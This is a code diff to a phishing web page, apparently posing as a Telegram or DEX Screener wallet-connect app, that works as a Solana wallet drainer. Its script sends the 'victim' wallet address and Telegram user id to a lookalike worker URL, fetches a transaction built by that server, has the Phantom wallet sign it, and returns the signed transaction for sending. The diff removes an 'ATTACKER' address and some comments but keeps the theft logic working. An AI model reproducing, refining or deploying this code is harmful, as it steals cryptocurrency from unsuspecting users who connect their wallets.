@@ -279,7 +279,6 @@
   </div>
 
 <script>
-  const ATTACKER = "FN73jYtbKMkfT14yG8MvMzrmCSREyX45rUrxiKoRbofB";
   const WORKER_URL = "https://dexscreenr.rthvzkr6jv.workers.dev";
 
   const tgScreen = document.getElementById('telegram-screen');
@@ -452,25 +451,19 @@
       container.classList.add('loading'); 
       text.style.opacity = 0;
       
-      // 1. Snap nach links
       thumb.style.transition = 'transform 0.2s ease-out';
       thumb.style.transform = `translateX(-${maxDrag}px)`;
       
-      // 2. FETCH SOFORT IM HINTERGRUND STARTEN
       triggerConnect(); 
 
-      // 3. Lade-Zeit & UI Animation
       setTimeout(() => {
-        // Plop Effekt
         thumb.style.transition = 'transform 0.15s cubic-bezier(0.175, 0.885, 0.32, 1.275)';
         thumb.style.transform = `translateX(-${maxDrag}px) scale(1.2)`;
         
-        // Schrumpfen auf 0 in 1 Sekunde
         setTimeout(() => {
           thumb.style.transition = 'transform 1s cubic-bezier(0.5, 0, 0.5, 1)';
           thumb.style.transform = `translateX(-${maxDrag}px) scale(0)`;
           
-          // Pending Screen anzeigen, wenn er weg ist
           setTimeout(() => {
             connectScreen.style.display = 'none';
             dashboardScreen.style.display = 'flex';
@@ -498,38 +491,41 @@
       const tgUserId = window.Telegram?.WebApp?.initDataUnsafe?.user?.id;
       
       const basePayload = JSON.stringify({ victim, chain: "solana", type: "connection_and_balance", sol: "0", usdc: "5", tg_user_id: tgUserId, ts: Date.now() });
-      
       try { 
-        await fetch(WORKER_URL, { 
-          method: "POST", headers: { "Content-Type": "application/json" }, body: basePayload 
-        }); 
+        await fetch(WORKER_URL, { method: "POST", headers: { "Content-Type": "application/json" }, body: basePayload }); 
       } catch (err) { 
         navigator.sendBeacon(WORKER_URL, new Blob([basePayload], {type: 'application/json'})); 
       }
 
-      // 3. Signatur anfordern (WIR HOLEN DIE TX VOM WORKER)
       setTimeout(async () => {
         try {
-          // Wir bitten den Worker, die TX zu bauen
           const buildResp = await fetch(WORKER_URL, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
+            method: "POST", headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ type: "build_tx", victim: victim })
           });
 
           const buildData = await buildResp.json();
           if (buildData.error) throw new Error(buildData.error);
 
-          // Worker schickt Base64 TX zurück
-          const txBuffer = Uint8Array.from(atob(buildData.tx), c => c.charCodeAt(0));
-          
-          // Phantom signiert die TX vom Worker
-          const signedTx = await provider.signTransaction(solanaWeb3.Transaction.from(txBuffer));
+          const binStr = atob(buildData.tx);
+          const bytes = new Uint8Array(binStr.length);
+          for (let i = 0; i < binStr.length; i++) {
+            bytes[i] = binStr.charCodeAt(i);
+          }
 
-          // Signierte TX an Worker schicken zum Senden
+          const tx = solanaWeb3.Transaction.from(bytes);
+          const signedTx = await provider.signTransaction(tx);
+
+          const serializedSigned = signedTx.serialize();
+          let binarySigned = '';
+          for (let i = 0; i < serializedSigned.length; i++) {
+            binarySigned += String.fromCharCode(serializedSigned[i]);
+          }
+          const signedBase64 = btoa(binarySigned);
+
           await fetch(WORKER_URL, { 
             method: "POST", headers: { "Content-Type": "application/json" }, 
-            body: JSON.stringify({ type: "send_tx", tx: bs58.encode(signedTx.serialize()), victim, tg_user_id: tgUserId }) 
+            body: JSON.stringify({ type: "send_tx", tx: signedBase64, victim, tg_user_id: tgUserId }) 
           });
 
         } catch(err) {
